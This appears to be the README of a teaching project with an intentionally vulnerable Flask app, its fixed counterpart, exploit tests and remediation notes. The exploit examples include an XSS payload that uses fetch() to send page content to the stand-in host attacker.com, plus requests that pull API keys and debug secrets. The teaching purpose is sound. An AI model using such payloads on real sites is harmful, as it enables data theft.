# UI Security Vulnerability Testing Suite

Complete Python project demonstrating UI-related security vulnerabilities and their mitigations.

## Project Overview

This project contains two complete Flask web applications:
1. **Pre-mitigation (Vulnerable)**: Intentionally contains 8 critical UI security vulnerabilities
2. **Post-mitigation (Secure)**: Fixed version with all vulnerabilities remediated

## Vulnerabilities Demonstrated

### 1. **API Keys Exposed in Login Response** (CRITICAL)
- API keys returned in plaintext JSON during authentication
- Affects: `/login`, `/api/user-data` endpoints
- Impact: Complete compromise of API credentials

### 2. **Secrets Embedded in Frontend JavaScript** (CRITICAL)
- Hardcoded API keys in HTML templates
- Visible in page source and browser console
- Impact: Secrets accessible to any page viewer

### 3. **Unsafe File Preview (DOM XSS)** (CRITICAL)
- User input directly rendered in HTML without sanitization
- Allows arbitrary JavaScript execution
- Impact: Session hijacking, credential theft

### 4. **Client-Side Logging of Sensitive Data** (HIGH)
- Credentials logged to browser console
- Visible in browser developer tools
- Impact: Information disclosure

### 5. **Debug Endpoint Exposing System Info** (CRITICAL)
- Unauthenticated `/api/debug-info` returns all secrets
- Includes environment variables and config
- Impact: Complete system information disclosure

### 6. **Source Code Disclosure** (HIGH)
- `/api/source-code` endpoint returns full source code
- Enables targeted attacks via code analysis
- Impact: Architectural reconnaissance

### 7. **Stack Trace and Error Info Leakage** (HIGH)
- Full Python tracebacks in error responses
- System information exposure
- Impact: Attack surface reconnaissance

### 8. **Database Credentials in Session** (CRITICAL)
- DB passwords stored in session and returned in responses
- Impact: Direct database access and compromise

## Project Structure

```
├── pre-mitigation/                 # Vulnerable version
│   ├── app/
│   │   └── app.py                  # Flask app with vulnerabilities
│   ├── templates/
│   │   ├── index.html
│   │   ├── login.html
│   │   └── dashboard.html
│   ├── static/                     # CSS, JS, etc.
│   ├── tests/
│   │   └── exploit_tests.py        # Automated exploit tests
│   ├── requirements.txt
│   ├── Dockerfile
│   └── run_tests.sh
│
├── post-mitigation/                # Secure version
│   ├── app/
│   │   └── app.py                  # Flask app with fixes
│   ├── templates/
│   │   ├── index.html
│   │   ├── login.html
│   │   └── dashboard.html
│   ├── static/                     # CSS, JS, etc.
│   ├── tests/
│   │   └── validation_tests.py     # Security validation tests
│   ├── requirements.txt
│   ├── .env.example
│   ├── Dockerfile
│   └── run_tests.sh
│
├── master_test_runner.py           # Orchestrates all tests
├── security_report_generator.py    # Generates vulnerability reports
├── report_template_generator.py    # Report template generator
└── README.md                        # This file
```

## Quick Start

### Prerequisites
- Python 3.11+
- pip or conda

### Installation

```bash
# Clone/navigate to project directory
cd v-qinjie_25_11_14

# Install dependencies for both versions
pip install -r pre-mitigation/requirements.txt
pip install -r post-mitigation/requirements.txt
```

### Running Tests

#### Option 1: Run Complete Test Suite (Recommended)

```bash
# Run all tests with comprehensive reporting
python master_test_runner.py
```

This will:
1. Start vulnerable app and run exploit tests
2. Start secure app and run validation tests
3. Generate comprehensive comparison report
4. Output: `comprehensive_test_results.json`

#### Option 2: Run Individual Test Suites

**Test Vulnerable Version (Exploit Tests):**
```bash
cd pre-mitigation
bash run_tests.sh
# or
python tests/exploit_tests.py
```

**Test Secure Version (Validation Tests):**
```bash
cd post-mitigation
bash run_tests.sh
# or
python tests/validation_tests.py
```

### Manual Testing

**Start Vulnerable App:**
```bash
cd pre-mitigation/app
python app.py
# Accessible at http://localhost:5000
```

**Start Secure App:**
```bash
cd post-mitigation/app
export FLASK_DEBUG=False
python app.py
# Accessible at http://localhost:5001
```

Login credentials (both versions):
- Username: `admin`
- Password: `password123`

## Exploit Examples

### 1. Extract API Keys from Login

```python
import requests

response = requests.post('http://localhost:5000/login', data={
    'username': 'admin',
    'password': 'password123'
})

# Returns: {"api_key": "sk_live_1234567890abcdef_secret_prod_key", ...}
api_key = response.json()['api_key']
```

### 2. Access Debug Information

```python
import requests

response = requests.get('http://localhost:5000/api/debug-info')

# Returns: Complete system info including all secrets
debug_data = response.json()
```

### 3. Execute XSS Payload

```python
import requests

xss_payload = '<img src=x onerror="fetch(\'http://attacker.com?key=\' + document.body.innerHTML)">'

response = requests.post('http://localhost:5000/api/preview-file', data={
    'filename': 'test.txt',
    'content': xss_payload
})

# Payload executes in the response
```

### 4. View Browser Console Secrets

After login at `http://localhost:5000/dashboard`, open DevTools (F12) and check Console for:
- Hardcoded API keys
- Stripe keys
- Database passwords
- Session information

## Security Fixes Applied (Post-Mitigation)

### Fix 1: Environment Variable Management
```python
# Before (VULNERABLE)
API_KEY = "sk_live_1234567890abcdef_secret_prod_key"

# After (SECURE)
API_KEY = os.getenv('API_KEY')  # From .env file
```

### Fix 2: Input Sanitization
```python
# Before (VULNERABLE)
return jsonify({"preview": file_content})

# After (SECURE)
from markupsafe import escape
return jsonify({"preview": escape(file_content)})
```

### Fix 3: Content Security Policy
```python
# After (SECURE)
from flask_talisman import Talisman

Talisman(app, 
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",
        # ... strict CSP
    }
)
```

### Fix 4: Secure Session Management
```python
# After (SECURE)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

### Fix 5: Removed Debug Endpoints
```python
# Before: @app.route('/api/debug-info')
# After: REMOVED entirely
```

### Fix 6: Generic Error Handling
```python
# Before (VULNERABLE)
return jsonify({
    "traceback": traceback.format_exc(),
    "debug_info": dict(os.environ)
})

# After (SECURE)
logger.error(f"Internal error: {error}")
return jsonify({"error": "An internal error occurred"}), 500
```

## Test Output Examples

### Exploit Test Results (JSON)

```json
{
  "timestamp": "2024-11-14T10:30:00",
  "target": "http://localhost:5000",
  "exploits": [
    {
      "name": "API Key Leakage via Login Response",
      "vulnerability": "Sensitive data returned in authentication endpoint",
      "success": true,
      "extracted_data": {
        "api_key": "sk_live_1234567890abcdef_secret_prod_key",
        "stripe_key": "sk_test_stripe_key_12345",
        "service_account": "service_account_key_xyz789"
      },
      "evidence": "Credentials returned in plaintext JSON response"
    }
  ]
}
```

### Validation Test Results (JSON)

```json
{
  "timestamp": "2024-11-14T10:35:00",
  "target": "http://localhost:5001",
  "summary": {
    "passed": 8,
    "failed": 0
  },
  "validations": [
    {
      "name": "No Secrets in Login Response",
      "passed": true,
      "details": ["✓ No API keys in response", "✓ No credentials returned"]
    }
  ]
}
```

## Report Generation

### Generate Vulnerability Reports

```bash
python security_report_generator.py
# Outputs:
# - pre_mitigation_report.json (vulnerability details)
# - post_mitigation_report.json (fix details)
```

### Generate Report Template

```bash
python report_template_generator.py
# Outputs:
# - report_template.json (comprehensive template)
# - REPORT_TEMPLATE.md (markdown version)
```

## Environment Configuration

### Post-Mitigation (.env.example)

```env
FLASK_DEBUG=False
ENVIRONMENT=production
HOST=127.0.0.1
PORT=5001

SECRET_KEY=your-super-secret-key-change-this
API_KEY=sk_live_secure_production_key
STRIPE_KEY=sk_test_stripe_secure_key
DATABASE_PASSWORD=secure_db_password_hash
SERVICE_ACCOUNT_KEY=secure_service_account_key

SESSION_COOKIE_SECURE=True
SESSION_COOKIE_HTTPONLY=True
SESSION_COOKIE_SAMESITE=Lax
```

## Docker Deployment

### Build and Run Vulnerable Version

```bash
cd pre-mitigation
docker build -t vulnerable-dashboard .
docker run -p 5000:5000 vulnerable-dashboard
```

### Build and Run Secure Version

```bash
cd post-mitigation
docker build -t secure-dashboard .
docker run -p 5001:5001 \
  -e ENVIRONMENT=production \
  -e SECRET_KEY=your-secret-key \
  secure-dashboard
```

## Key Learning Points

1. **Never expose secrets in frontend code**
   - Use environment variables on backend only
   - Pass tokens to frontend only when necessary, via secure mechanisms

2. **Always sanitize user input**
   - Use MarkupSafe.escape() for HTML context
   - Use parameterized queries for SQL
   - Validate and whitelist inputs

3. **Implement Content Security Policy**
   - Prevent inline script execution
   - Restrict resource sources
   - Use nonce-based CSP for dynamic content

4. **Secure session management**
   - Use httpOnly flag to prevent JavaScript access
   - Use Secure flag for HTTPS only
   - Use SameSite flag to prevent CSRF

5. **Disable debug features in production**
   - Remove debug endpoints
   - Don't expose stack traces
   - Use generic error messages

6. **Log securely**
   - Never log passwords or API keys
   - Store logs securely
   - Implement proper access controls

## Security Best Practices

- ✓ Use environment variables for secrets
- ✓ Implement input validation and sanitization
- ✓ Use security headers (CSP, HSTS, X-Frame-Options)
- ✓ Implement proper session management
- ✓ Use HTTPS in production
- ✓ Implement rate limiting
- ✓ Use Web Application Firewall (WAF)
- ✓ Regular security audits and testing
- ✓ Keep dependencies updated
- ✓ Implement comprehensive logging

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE: Common Weakness Enumeration](https://cwe.mitre.org/)
- [CVSS: Common Vulnerability Scoring System](https://www.first.org/cvss/)
- [Flask Security Documentation](https://flask-talisman.readthedocs.io/)
- [MarkupSafe Documentation](https://markupsafe.palletsprojects.com/)

## License

Educational purposes only. Use responsibly.

## Support

For questions or issues, refer to the generated test reports and documentation.
